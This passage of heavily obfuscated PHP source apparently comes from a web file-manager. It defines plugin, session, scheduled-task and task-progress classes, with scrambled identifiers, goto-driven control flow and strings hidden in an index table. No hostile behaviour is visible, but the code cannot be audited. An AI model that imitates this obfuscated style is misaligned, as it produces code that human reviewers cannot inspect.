Hook::apply($CåõÆº‡á¿ . $bª…˜À‹£‘[1809]); } $this->remove($b“ù¾¹™ñÔ[$bª…˜À‹£‘[393]]); } public function changeStatus($a´«åñŞ„Ö, $f¹Ş¡¯½¸Í) { $F¼¹Ã²™ =& $_SERVER[«¾°Ã¤]; $fÍ·Õ¦•é± = $this->loadList($a´«åñŞ„Ö); if ($f¹Ş¡¯½¸Í) { Hook::apply($a´«åñŞ„Ö . $F¼¹Ã²™[1810]); } $this->update($fÍ·Õ¦•é±[$F¼¹Ã²™[393]], array($F¼¹Ã²™[1811] => $f¹Ş¡¯½¸Í)); } public function appRegist($A¼îÆÑ®¦, $bÏõ¢ôªí) { $cíˆŒ­Éï… =& $_SERVER[«¾°Ã¤]; $E‰·¡ï¥ = $this->loadList($A¼îÆÑ®¦); if ($E‰·¡ï¥) { $this->update($E‰·¡ï¥[$cíˆŒ­Éï…[393]], array($cíˆŒ­Éï…[1805] => $bÏõ¢ôªí)); } else { $B‚×ÉŠÆ = array($cíˆŒ­Éï…[28] => $A¼îÆÑ®¦, $cíˆŒ­Éï…[1805] => $bÏõ¢ôªí, $cíˆŒ­Éï…[719] => 0, $cíˆŒ­Éï…[6] => $this->getConfigDefault($A¼îÆÑ®¦)); $this->insert($B‚×ÉŠÆ); } } public function getConfigDefault($Eõ½»À„) { $fĞŠ‚¦ğÄÃ =& $_SERVER[«¾°Ã¤]; $C£ŠÙÆº¾Ê = array(); $F‹ëí—Ñğ‡ = $this->getPackageJson($Eõ½»À„); if (!$F‹ëí—Ñğ‡ && is_array($F‹ëí—Ñğ‡[$fĞŠ‚¦ğÄÃ[1812]])) { return $C£ŠÙÆº¾Ê; } foreach ($F‹ëí—Ñğ‡[$fĞŠ‚¦ğÄÃ[1812]] as $CÕøÑÍŒ®Ç => $aÑ±©Ñ”‘) { if (!isset($aÑ±©Ñ”‘[$fĞŠ‚¦ğÄÃ[372]]) || isset($C£ŠÙÆº¾Ê[$CÕøÑÍŒ®Ç])) { continue; } $C£ŠÙÆº¾Ê[$CÕøÑÍŒ®Ç] = $aÑ±©Ñ”‘[$fĞŠ‚¦ğÄÃ[372]]; } return $C£ŠÙÆº¾Ê; } public function getPackageJson($B„¤“ÈÀõ) { return Hook::apply($B„¤“ÈÀõ . $_SERVER[«¾°Ã¤][1813]); } public function getConfig($F²Úà·ƒÏ·, $d¹ÙŠ‡ó¥‚ = false) { $DÙó³Ù‘ò· =& $_SERVER[«¾°Ã¤]; $fŒƒŞÍ«š = array(); $b†‚Ö¥¾†å = $this->loadList($F²Úà·ƒÏ·); if ($b†‚Ö¥¾†å && is_array($b†‚Ö¥¾†å[$DÙó³Ù‘ò·[6]])) { $fŒƒŞÍ«š = $b†‚Ö¥¾†å[$DÙó³Ù‘ò·[6]]; } if (!$fŒƒŞÍ«š || $d¹ÙŠ‡ó¥‚) { $fŒƒŞÍ«š = $this->getConfigDefault($F²Úà·ƒÏ·); } return $fŒƒŞÍ«š; } public function setConfig($f…‚¢†´, $F‰‘¨…à„ˆ = false) { goto AÕİÖø„ë; bèŠ­‚š¼¶: $a¸¶ÕÏƒ¶È = $D‚¥²Æˆ¾[$CÓÄßĞ µ¹[6]]; if ($F‰‘¨…à„ˆ == !1) { $a¸¶ÕÏƒ¶È = array(); $F‰‘¨…à„ˆ = $this->getConfigDefault($f…‚¢†´); } foreach ($F‰‘¨…à„ˆ as $bòÅò¼İ–æ => $eË¬Ô‹›ƒƒ) { $a¸¶ÕÏƒ¶È[$bòÅò¼İ–æ] = is_string($eË¬Ô‹›ƒƒ) ? trim($eË¬Ô‹›ƒƒ) : $eË¬Ô‹›ƒƒ; } goto AóØ»Â ; AóØ»Â : $this->update($D‚¥²Æˆ¾[$CÓÄßĞ µ¹[393]], array($CÓÄßĞ µ¹[6] => $a¸¶ÕÏƒ¶È)); goto Bº­ãã¸Ëˆ; AÕİÖø„ë: $CÓÄßĞ µ¹ =& $_SERVER[«¾°Ã¤]; $D‚¥²Æˆ¾ = $this->loadList($f…‚¢†´); if (!$D‚¥²Æˆ¾) { return !1; } goto bèŠ­‚š¼¶; Bº­ãã¸Ëˆ: } public function viewList() { goto b½—ƒ¥¢Ğ; fé¤°¬åÒô: $E”×š˜½¬± = $this->loadPluginList(); $cóÛœ‹Ş = array(); foreach ($E”×š˜½¬± as $Dªì‡¡ö†‹ => $cÙ„«Œ»„Ë) { unset($cÙ„«Œ»„Ë[$bŠÚ«ôÃ†[1805]], $cÙ„«Œ»„Ë[$bŠÚ«ôÃ†[6]]); $D¥ƒ¤ˆ… = PLUGIN_DIR . $cÙ„«Œ»„Ë[$bŠÚ«ôÃ†[28]] . $bŠÚ«ôÃ†[1807]; if (!is_file($D¥ƒ¤ˆ…)) { continue; } $aó·àôé¡¢ = Hook::apply($cÙ„«Œ»„Ë[$bŠÚ«ôÃ†[28]] . $bŠÚ«ôÃ†[1813]); if (is_array($aó·àôé¡¢)) { $cóÛœ‹Ş[$Dªì‡¡ö†‹] = array_merge($cÙ„«Œ»„Ë, $aó·àôé¡¢); } } goto DÖ¥ÉÔ÷›; DÖ¥ÉÔ÷›: return $cóÛœ‹Ş; goto dàŠ¢Âƒ¿; b½—ƒ¥¢Ğ: $bŠÚ«ôÃ† =& $_SERVER[«¾°Ã¤]; $E”×š˜½¬± = $this->loadList(); $this->pluginScan($E”×š˜½¬±); goto fé¤°¬åÒô; dàŠ¢Âƒ¿: } private function loadPluginList() { $e¢Ôà¦‰º =& $_SERVER[«¾°Ã¤]; $A­„¢èÇ… = $this->loadList(); if (strtolower(MOD) == $e¢Ôà¦‰º[1814]) { return $A­„¢èÇ…; } $eª‹‰¤†‚ = Hook::trigger($e¢Ôà¦‰º[1815], $A­„¢èÇ…); if ($A­„¢èÇ… && !$eª‹‰¤†‚) { die; } return $eª‹‰¤†‚ ? $eª‹‰¤†‚ : $A­„¢èÇ…; } private function pluginScan($A„ƒã„Çœï) { $f±Ç×Øšæ =& $_SERVER[«¾°Ã¤]; recursion_dir(PLUGIN_DIR, $eŒï»ÇİÅæ, $B»åˆºº®, 0); foreach ($eŒï»ÇİÅæ as $D©Ì¼‚Ÿï•) { $dƒœ¨†Ï‘¨ = get_path_this($D©Ì¼‚Ÿï•); if (isset($A„ƒã„Çœï[$dƒœ¨†Ï‘¨]) || !file_exists($D©Ì¼‚Ÿï• . $f±Ç×Øšæ[1816]) || !file_exists($D©Ì¼‚Ÿï• . $f±Ç×Øšæ[1807])) { continue; } Hook::apply($dƒœ¨†Ï‘¨ . $f±Ç×Øšæ[1810]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\137\163\x65\163\163\151\157\x6e"; public function get($d¸»íİ±Û·) { $d±àÎÔ·Ë =& $_SERVER[«¾°Ã¤]; $bäš¡š›¶Å = $this->where(array($d±àÎÔ·Ë[1817] => $d¸»íİ±Û·))->find(); if (!is_array($bäš¡š›¶Å)) { return !1; } return $bäš¡š›¶Å[$d±àÎÔ·Ë[724]]; } public function set($fï¤ÕÄîæ, $a°¤‘õ©, $AØïš“¡ø = 3600) { $DŞñ¼â¬ˆŒ =& $_SERVER[«¾°Ã¤]; $EŒù²Ù‰ = array($DŞñ¼â¬ˆŒ[1817] => $fï¤ÕÄîæ, $DŞñ¼â¬ˆŒ[1726] => $a°¤‘õ©, $DŞñ¼â¬ˆŒ[1818] => $AØïš“¡ø + time()); if (Session::get($DŞñ¼â¬ˆŒ[1819])) { $EŒù²Ù‰[$DŞñ¼â¬ˆŒ[1529]] = Session::get($DŞñ¼â¬ˆŒ[1819]); } else { $EŒù²Ù‰[$DŞñ¼â¬ˆŒ[1529]] = 0; } if ($this->get($fï¤ÕÄîæ)) { return $this->where(array($DŞñ¼â¬ˆŒ[1817] => $fï¤ÕÄîæ))->save($EŒù²Ù‰); } else { return $this->add($EŒù²Ù‰, array(), !0); } } public function remove($FÔ ¬Èõæ­) { return $this->where(array($_SERVER[«¾°Ã¤][1817] => $FÔ ¬Èõæ­))->delete(); } public function clearTimeout() { return $this->where($_SERVER[«¾°Ã¤][1820] . time())->delete(); } } goto b²œÌùì; fá«÷’ÄÂ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto AÀ±–î¯‰í; B›ö«±îª: while (!0) { self::cacheClear(); if (self::valueGet($B“çÀæËáÔ[719]) != $B“çÀæËáÔ[87]) { self::valueSet($B“çÀæËáÔ[1493], $B“çÀæËáÔ[191]); self::log($B“çÀæËáÔ[1497]); die; } self::valueSet($B“çÀæËáÔ[1493], $B“çÀæËáÔ[87]); self::valueSet($B“çÀæËáÔ[1494], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto AšÓ”©â†; EÓãÔ¯¾: http_close(); self::valueSet($B“çÀæËáÔ[1493], $B“çÀæËáÔ[87]); Hook::bind($B“çÀæËáÔ[1495], $B“çÀæËáÔ[1496]); goto B›ö«±îª; AÀ±–î¯‰í: $B“çÀæËáÔ =& $_SERVER[«¾°Ã¤]; if (self::valueGet($B“çÀæËáÔ[719]) != $B“çÀæËáÔ[87]) { return; } if (self::valueGet($B“çÀæËáÔ[1493]) == $B“çÀæËáÔ[87]) { $EÖ„Ş§Ñá˜ = self::valueGet($B“çÀæËáÔ[1494]); if (time() - $EÖ„Ş§Ñá˜ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto EÓãÔ¯¾; AšÓ”©â†: } public static function restart() { $Bá¹”šˆ»ß =& $_SERVER[«¾°Ã¤]; http_close(); self::valueSet($Bá¹”šˆ»ß[719], $Bá¹”šˆ»ß[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($Bá¹”šˆ»ß[1493], $Bá¹”šˆ»ß[191]); self::valueSet($Bá¹”šˆ»ß[719], $Bá¹”šˆ»ß[87]); } public static function shutdownEvent() { $d·“À½ƒğ’ =& $_SERVER[«¾°Ã¤]; self::valueSet($d·“À½ƒğ’[1493], $d·“À½ƒğ’[191]); self::log($d·“À½ƒğ’[1498]); } public static function config($Cíæ›Í³, $EØÔì„¦•›) { self::valueSet($_SERVER[«¾°Ã¤][719], $Cíæ›Í³); } private static function taskRunAll() { goto A·æ´ñ—Ú¶; DƒÆ‘»: $Aµ¿İÆÁ¿ = count($Cï¸‡ÊÇãõ); for ($f‰–Ú½Ñô = 0; $f‰–Ú½Ñô < $Aµ¿İÆÁ¿; $f‰–Ú½Ñô++) { $AÇ˜«½Ó‘ = $Cï¸‡ÊÇãõ[$f‰–Ú½Ñô]; if (!$AÇ˜«½Ó‘[$CËÓİğÁìù[393]] || $AÇ˜«½Ó‘[$CËÓİğÁìù[1500]] != $CËÓİğÁìù[87]) { continue; } if (!self::taskTimeCheck($AÇ˜«½Ó‘)) { continue; } self::taskRun($AÇ˜«½Ó‘); } Hook::trigger($CËÓİğÁìù[1501]); goto Fâå•Å¨Óñ; Fâå•Å¨Óñ: self::taskQueueRun($E¶ùì¦„‚); self::closeDatabase(); goto aÖ†­â¢è±; A·æ´ñ—Ú¶: $CËÓİğÁìù =& $_SERVER[«¾°Ã¤]; $E¶ùì¦„‚ = timeFloat(); $Cï¸‡ÊÇãõ = Model($CËÓİğÁìù[1499])->listData(); goto DƒÆ‘»; aÖ†­â¢è±: } private static function taskQueueRun($F¹å×‹Ë‡¢) { $aĞßØªà×’ = 10; while (!0) { $Cáİñ•ºŠ‰ = TaskQueue::run(); if ($Cáİñ•ºŠ‰ === !1) { break; } if (timeFloat() - $F¹å×‹Ë‡¢ >= $aĞßØªà×’) { break; } } } private static function taskTimeCheck($c½ƒ¥ƒ–‰±) { goto AÙï’›ø‘£; AÙï’›ø‘£: $CäÕº™ Â‹ =& $_SERVER[«¾°Ã¤]; $f«¹ğ’ì‰ø = json_decode($c½ƒ¥ƒ–‰±[$CäÕº™ Â‹[197]], !0); $D¨…ììîÃé = intval($c½ƒ¥ƒ–‰±[$CäÕº™ Â‹[1494]]); goto EØå½¶¥¹ù; EØå½¶¥¹ù: $fŒ¿µ¾÷® = strtotime($CäÕº™ Â‹[1502] . $f«¹ğ’ì‰ø[$CäÕº™ Â‹[1503]] . $CäÕº™ Â‹[1504]) - strtotime($CäÕº™ Â‹[1505]); $bÑ·Ó¯‚ŸÔ = time() - strtotime(date($CäÕº™ Â‹[1506]) . $CäÕº™ Â‹[1507]); $D–íëåˆ¸ = $bÑ·Ó¯‚ŸÔ >= $fŒ¿µ¾÷® && $bÑ·Ó¯‚ŸÔ <= $fŒ¿µ¾÷® + 3600; goto E‘ Ê£÷; E‘ Ê£÷: switch ($f«¹ğ’ì‰ø[$CäÕº™ Â‹[29]]) { case $CäÕº™ Â‹[1508]: if (time() - $D¨…ììîÃé < 3600 * 24 * 30) { return !1; } if ($f«¹ğ’ì‰ø[$CäÕº™ Â‹[1508]] == date($CäÕº™ Â‹[1509]) && $D–íëåˆ¸) { return !0; } break; case $CäÕº™ Â‹[1510]: if (time() - $D¨…ììîÃé < 3600 * 24 * 7) { return !1; } $B¹˜“Õé‰Ø = date($CäÕº™ Â‹[1511]) == 0 ? 7 : date($CäÕº™ Â‹[1511]); if ($f«¹ğ’ì‰ø[$CäÕº™ Â‹[1510]] == $B¹˜“Õé‰Ø && $D–íëåˆ¸) { return !0; } break; case $CäÕº™ Â‹[1503]: if (time() - $D¨…ììîÃé < 3600 * 24) { return !1; } if ($D–íëåˆ¸) { return !0; } break; case $CäÕº™ Â‹[1512]: if (time() - $D¨…ììîÃé >= floatval($f«¹ğ’ì‰ø[$CäÕº™ Â‹[1512]]) * 60) { return !0; } break; default: break; } return !1; goto d§à×Š¸ ñ; d§à×Š¸ ñ: } private static function closeDatabase() { goto Aå°ßĞí’ó; Aå°ßĞí’ó: $BˆÉÁ¹Ö·‹ =& $_SERVER[«¾°Ã¤]; static $cÀ»Ú¹Ä—Ê = 0; $dËğÚ‘Š´å = 1800; goto FÇËÇŞìÅĞ; FÇËÇŞìÅĞ: if (!$cÀ»Ú¹Ä—Ê) { $cÀ»Ú¹Ä—Ê = time(); } if (time() - $cÀ»Ú¹Ä—Ê < $dËğÚ‘Š´å) { return; } $cÀ»Ú¹Ä—Ê = time(); goto f˜†ª¾ª¥; f˜†ª¾ª¥: $B›Œ¤”Åµ¤ = Model($BˆÉÁ¹Ö·‹[511])->db($BˆÉÁ¹Ö·‹[33]); if ($B›Œ¤”Åµ¤) { $B›Œ¤”Åµ¤->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($BˆÉÁ¹Ö·‹[1513], $BˆÉÁ¹Ö·‹[1514]); die; } goto C›Ê‚µ©áÂ; C›Ê‚µ©áÂ: } public static function taskRun($D‚Î´ŞŠà) { goto B·á±ŞÀŸ©; Aƒ¡‹â©šÆ: Model($D¯ªÓ´³†·[1519])->add(array($D¯ªÓ´³†·[1520] => $D¯ªÓ´³†·[33], $D¯ªÓ´³†·[1521] => $D¯ªÓ´³†·[191], $D¯ªÓ´³†·[29] => $D¯ªÓ´³†·[1522] . $D‚Î´ŞŠà[$D¯ªÓ´³†·[393]], $D¯ªÓ´³†·[1523] => json_encode(array($D¯ªÓ´³†·[28] => $D‚Î´ŞŠà[$D¯ªÓ´³†·[28]], $D¯ªÓ´³†·[1524] => timeFloat() - $E¢Şƒ±Óå, $D¯ªÓ´³†·[291] => $dËä¿‡Â†™)))); self::log($D¯ªÓ´³†·[1525] . $D‚Î´ŞŠà[$D¯ªÓ´³†·[393]] . $D¯ªÓ´³†·[1526] . $dËä¿‡Â†™); return !0; goto cŠË¸¡ÚÕ»; B·á±ŞÀŸ©: $D¯ªÓ´³†· =& $_SERVER[«¾°Ã¤]; self::log($D¯ªÓ´³†·[1515] . $D‚Î´ŞŠà[$D¯ªÓ´³†·[393]] . $D¯ªÓ´³†·[1516] . $D‚Î´ŞŠà[$D¯ªÓ´³†·[28]] . $D¯ªÓ´³†·[1517] . $D‚Î´ŞŠà[$D¯ªÓ´³†·[1518]]); Model($D¯ªÓ´³†·[1499])->run($D‚Î´ŞŠà[$D¯ªÓ´³†·[393]]); goto a¾’İ”‘ôÉ; a¾’İ”‘ôÉ: $E¢Şƒ±Óå = timeFloat(); $dËä¿‡Â†™ = $D¯ªÓ´³†·[33]; switch ($D‚Î´ŞŠà[$D¯ªÓ´³†·[29]]) { case $D¯ªÓ´³†·[305]: $f«‡Ë·ê…‘ = url_request($D‚Î´ŞŠà[$D¯ªÓ´³†·[1518]], $D¯ªÓ´³†·[228], !1, !1, !1, !1, 10); if ($f«‡Ë·ê…‘[$D¯ªÓ´³†·[719]]) { $dËä¿‡Â†™ = strlen($f«‡Ë·ê…‘[$D¯ªÓ´³†·[1089]]); } break; case $D¯ªÓ´³†·[227]: $dËä¿‡Â†™ = Hook::apply($D‚Î´ŞŠà[$D¯ªÓ´³†·[1518]]); default: break; } goto Aƒ¡‹â©šÆ; cŠË¸¡ÚÕ»: } private static function valueGet($bëù­ùÔ¶×) { $bÒ£âŒŒ” =& $_SERVER[«¾°Ã¤]; $aàÓàÛğ·ù = $bÒ£âŒŒ”[1527]; $F ù¨—ğÀ„ = Model($bÒ£âŒŒ”[1528])->get($bëù­ùÔ¶×, $aàÓàÛğ·ù); if (is_null($F ù¨—ğÀ„)) { Model($bÒ£âŒŒ”[1528])->set($bÒ£âŒŒ”[719], $bÒ£âŒŒ”[87], $aàÓàÛğ·ù); Model($bÒ£âŒŒ”[1528])->set($bÒ£âŒŒ”[1493], $bÒ£âŒŒ”[191], $aàÓàÛğ·ù); $F ù¨—ğÀ„ = Model($bÒ£âŒŒ”[1528])->get($bëù­ùÔ¶×, $aàÓàÛğ·ù); } return $F ù¨—ğÀ„; } private static function valueSet($eªÈƒóõ‘ö, $F†š¸ùŞ) { $a‰’ÙÖôÃ† =& $_SERVER[«¾°Ã¤]; return Model($a‰’ÙÖôÃ†[1528])->set($eªÈƒóõ‘ö, $F†š¸ùŞ, $a‰’ÙÖôÃ†[1527]); } protected static function log($eÙ™è–Óª) { write_log($eÙ™è–Óª, $_SERVER[«¾°Ã¤][1514]); } private static function cacheClear() { $d‹Ë‘¹×˜î =& $_SERVER[«¾°Ã¤]; $E…´‘¥”õ = Model($d‹Ë‘¹×˜î[1528])->cacheKey($d‹Ë‘¹×˜î[1527]); Cache::clearMemory($E…´‘¥”õ); Model($d‹Ë‘¹×˜î[1499])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\156\151\156\147"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($Cìœ¦‰Ğ–ë, $dÓ©…å‘µ = '', $A–†Ô™Å»Ù = 0, $F÷®ÚÈÕ±ç = '') { goto b¯Š¸ÀÔæ; cÎİÊ–Æå: $this->startAfter(); Hook::trigger($fÈ¯¼ºäŒ[1539], $this->task); $this->task[$fÈ¯¼ºäŒ[1532]] = timeFloat(); goto CÛ‚­ñÊ; A¤¶…ä†ê÷: $GLOBALS[$fÈ¯¼ºäŒ[1535]] = 1; Hook::bind($fÈ¯¼ºäŒ[1495], array($this, $fÈ¯¼ºäŒ[1536])); Hook::bind($fÈ¯¼ºäŒ[1537], array($this, $fÈ¯¼ºäŒ[1538])); goto cÎİÊ–Æå; b¯Š¸ÀÔæ: $fÈ¯¼ºäŒ =& $_SERVER[«¾°Ã¤]; if (self::get($Cìœ¦‰Ğ–ë)) { return; } $this->task = array($fÈ¯¼ºäŒ[393] => $Cìœ¦‰Ğ–ë, $fÈ¯¼ºäŒ[1529] => USER_ID, $fÈ¯¼ºäŒ[1434] => $F÷®ÚÈÕ±ç, $fÈ¯¼ºäŒ[29] => $dÓ©…å‘µ, $fÈ¯¼ºäŒ[1024] => $fÈ¯¼ºäŒ[33], $fÈ¯¼ºäŒ[1022] => $A–†Ô™Å»Ù, $fÈ¯¼ºäŒ[1037] => 0, $fÈ¯¼ºäŒ[1530] => 0, $fÈ¯¼ºäŒ[1531] => 0, $fÈ¯¼ºäŒ[758] => timeFloat(), $fÈ¯¼ºäŒ[757] => 0, $fÈ¯¼ºäŒ[1532] => 0, $fÈ¯¼ºäŒ[1533] => 0, $fÈ¯¼ºäŒ[1534] => 0, $fÈ¯¼ºäŒ[719] => $fÈ¯¼ºäŒ[1493]); goto A¤¶…ä†ê÷; CÛ‚­ñÊ: } public function end() { goto fô—²ñŞÆ˜; fô—²ñŞÆ˜: $F‘Í­ÒĞ =& $_SERVER[«¾°Ã¤]; if (!$this->task) { return; } if ($this->task[$F‘Í­ÒĞ[1532]]) { self::valueSet($this->task[$F‘Í­ÒĞ[393]], !1); } goto eÇÀÃåç½í; eÙô‰¾éŒ¸: Hook::unbind($F‘Í­ÒĞ[1537], array($this, $F‘Í­ÒĞ[1538])); $this->endAfter(); $this->task = !1; goto a˜Ÿ„ÓÄïå; eÇÀÃåç½í: $C Ìá‚á¬Ñ = timeFloat() - $this->task[$F‘Í­ÒĞ[758]]; self::log($F‘Í­ÒĞ[1540] . $this->task[$F‘Í­ÒĞ[393]] . $F‘Í­ÒĞ[1541] . $C Ìá‚á¬Ñ . $F‘Í­ÒĞ[1542]); Hook::unbind($F‘Í­ÒĞ[1495], array($this, $F‘Í­ÒĞ[1536])); goto eÙô‰¾éŒ¸; a˜Ÿ„ÓÄïå: } public function update($cÑéŒ£ÔËå = 0, $d›ÕÙùÈ£ = false) { goto B¢â†Íµç¦; f¿²ÒÓ×â: $DÃÎòö‡—„[$d¨ñÍ‰Üğ[719]] = $EğõÑî‚‚ ? $EğõÑî‚‚ : $DÃÎòö‡—„[$d¨ñÍ‰Üğ[719]]; $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1533]] = $d­·¼ã„§[$d¨ñÍ‰Üğ[1533]] ? $d­·¼ã„§[$d¨ñÍ‰Üğ[1533]] : 0; $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1532]] = timeFloat(); goto EĞÙÑˆğÁğ; aªÆ†Á‰å: $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1037]] += $cÑéŒ£ÔËå; $DÃÎòö‡—„[$d¨ñÍ‰Üğ[757]] = timeFloat(); if ($DÃÎòö‡—„[$d¨ñÍ‰Üğ[1022]]) { if ($DÃÎòö‡—„[$d¨ñÍ‰Üğ[1022]] < $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1037]]) { $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1022]] = $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1037]]; } $e¿Ñ„Ü™ = timeFloat() - $DÃÎòö‡—„[$d¨ñÍ‰Üğ[758]] - $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1533]]; $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1530]] = $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1037]] / $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1022]]; $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1531]] = $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1037]] / $e¿Ñ„Ü™; if ($DÃÎòö‡—„[$d¨ñÍ‰Üğ[1530]] > 0) { $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1534]] = $e¿Ñ„Ü™ * (1 - $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1530]]) / $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1530]]; } $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1534]] = $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1534]] <= 0 ? 0 : $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1534]]; } goto aÕíù•Îî«; B¢â†Íµç¦: $d¨ñÍ‰Üğ =& $_SERVER[«¾°Ã¤]; $DÃÎòö‡—„ =& $this->task; if (!$DÃÎòö‡—„) { return; } goto aªÆ†Á‰å; F¹ç»°¹¼: $d­·¼ã„§ = self::get($DÃÎòö‡—„[$d¨ñÍ‰Üğ[393]]); $EğõÑî‚‚ = $d­·¼ã„§[$d¨ñÍ‰Üğ[719]]; if ($EğõÑî‚‚ == self::STATYS_KILL) { $dÕåİô„§¤ = array($d¨ñÍ‰Üğ[1543] => LNG($d¨ñÍ‰Üğ[1544]), $d¨ñÍ‰Üğ[1087] => !1); Cache::set($d¨ñÍ‰Üğ[1545] . $this->task[$d¨ñÍ‰Üğ[393]], $dÕåİô„§¤, 30); $this->onKill(); $this->end(); die; } else { if ($EğõÑî‚‚ == self::STATYS_STOP) { $F½Ÿ°Ü‹ä¬ = 2; $d­·¼ã„§[$d¨ñÍ‰Üğ[1533]] += $F½Ÿ°Ü‹ä¬; self::valueSet($DÃÎòö‡—„[$d¨ñÍ‰Üğ[393]], $d­·¼ã„§); sleep($F½Ÿ°Ü‹ä¬); $this->update(); return; } } goto f¿²ÒÓ×â; EĞÙÑˆğÁğ: Hook::trigger($d¨ñÍ‰Üğ[1546], $DÃÎòö‡—„); self::valueSet($DÃÎòö‡—„[$d¨ñÍ‰Üğ[393]], $DÃÎòö‡—„); goto F¬ßŒ‚©äõ; aÕíù•Îî«: $this->updateAfter(); $eàÉÊš±Ï = 0.2; if (timeFloat() - $DÃÎòö‡—„[$d¨ñÍ‰Üğ[1532]] < $eàÉÊš±Ï && !$d›ÕÙùÈ£) { return; } goto F¹ç»°¹¼; F¬ßŒ‚©äõ: } public function onKillSet($C¯ØßæÂßÓ, $döÙğ = array()) { $this->onKillCall = array($C¯ØßæÂßÓ, $döÙğ); } public function onKill() { $D¹îº¸³‚Â =& $_SERVER[«¾°Ã¤]; self::log($D¹îº¸³‚Â[1540] . $this->task[$D¹îº¸³‚Â[393]] . $D¹îº¸³‚Â[1547]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($c¥°¥å„¬) { $Aº‚¢í²Œí =& $_SERVER[«¾°Ã¤]; Cache::set($Aº‚¢í²Œí[1545] . $this->task[$Aº‚¢í²Œí[393]], $c¥°¥å„¬, 60); return $c¥°¥å„¬; } public static function get($E± †×¡Ëó) { return self::valueGet($E± †×¡Ëó); } public static function listData() { $Cì·ó®Ê… = self::valueGet(); return array_sort_by($Cì·ó®Ê…, $_SERVER[«¾°Ã¤][758], !0); } public static function kill($bÎå´ ©†°) { return self::changeStatus($bÎå´ ©†°, self::STATYS_KILL); } public static function stop($CİŠš¹¹Îâ) { return self::changeStatus($CİŠš¹¹Îâ, self::STATYS_STOP); } public static function restart($f’Áğ–ÉÃÎ) { return self::changeStatus($f’Áğ–ÉÃÎ, self::STATYS_RUNNING); } public static function killAll() { $F¹ùÄî¤ğ =& $_SERVER[«¾°Ã¤]; $cÂË·ôÏ = self::listData(); foreach ($cÂË·ôÏ as $AÑ©˜…œâ) { self::kill($AÑ©˜…œâ[$F¹ùÄî¤ğ[393]]); } sleep(2); foreach ($cÂË·ôÏ as $AÑ©˜…œâ) { self::valueSet($AÑ©˜…œâ[$F¹ùÄî¤ğ[393]], !1); } } private static function changeStatus($fç‹§×Åïó, $AîºÅ„Ş¼‰) { goto eÌ¨»º¼š–; eÌ¨»º¼š–: $F¤«¹éèÊ =& $_SERVER[«¾°Ã¤]; $Cµ¤¹éˆÂ = self::valueGet($fç‹§×Åïó); if (!$Cµ¤¹éˆÂ) { return !1; } goto eÔñ¶Ìç•Ê; fÊœÂ‹Ø: return !0; goto d™¦£…Œá; eÔñ¶Ìç•Ê: $Cµ¤¹éˆÂ[$F¤«¹éèÊ[719]] = $AîºÅ„Ş¼‰; self::valueSet($fç‹§×Åïó, $Cµ¤¹éˆÂ); self::log($F¤«¹éèÊ[1548] . $Cµ¤¹éˆÂ[$F¤«¹éèÊ[393]] . $F¤«¹éèÊ[1549] . $AîºÅ„Ş¼‰); goto fÊœÂ‹Ø; d™¦£…Œá: } public static function valueGet($B­ğ½¦¾“ = false) { $eÌá˜±Ç´ë =& $_SERVER[«¾°Ã¤]; if ($B­ğ½¦¾“) { $aÀÆ´‹À  = Model($eÌá˜±Ç´ë[434])->where(array($eÌá˜±Ç´ë[93] => $B­ğ½¦¾“, $eÌá˜±Ç´ë[29] => $eÌá˜±Ç´ë[1550]))->find(); return $aÀÆ´‹À  ? json_decode($aÀÆ´‹À [$eÌá˜±Ç´ë[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Aæä¸¯‘ñ“ = false) { goto BºÈ©«ğƒê; BºÈ©«ğƒê: $b¸³¤‹‹Şƒ =& $_SERVER[«¾°Ã¤]; $a·µ¬è÷Ê· = array($b¸³¤‹‹Şƒ[29] => $b¸³¤‹‹Şƒ[1550]); if ($Aæä¸¯‘ñ“) { $a·µ¬è÷Ê·[$b¸³¤‹‹Şƒ[1529]] = $Aæä¸¯‘ñ“; } goto F‹Ÿ‡ç·ß; F‹Ÿ‡ç·ß: $A««ùŸÂ™’ = Model($b¸³¤‹‹Şƒ[434])->where($a·µ¬è÷Ê·)->select(); $A««ùŸÂ™’ = $A««ùŸÂ™’ ? $A««ùŸÂ™’ : array(); foreach ($A««ùŸÂ™’ as $E±§³‰÷’¸ => $A†»¦©¨ÙÉ) { $A««ùŸÂ™’[$E±§³‰÷’¸] = json_decode($A†»¦©¨ÙÉ[$b¸³¤‹‹Şƒ[372]], !0); } goto fŠç•»ë±¦; fŠç•»ë±¦: return $A««ùŸÂ™’; goto Dğ±ëİ¢¡™; Dğ±ëİ¢¡™: } public static function valueSet($dĞÙ‹ĞÙŒ, $e‘ëÇµ³‰) { goto BÊõŒ×Ğ; BÊõŒ×Ğ: $A‰é»™ŞÖ =& $_SERVER[«¾°Ã¤]; if (!$e‘ëÇµ³‰) { return 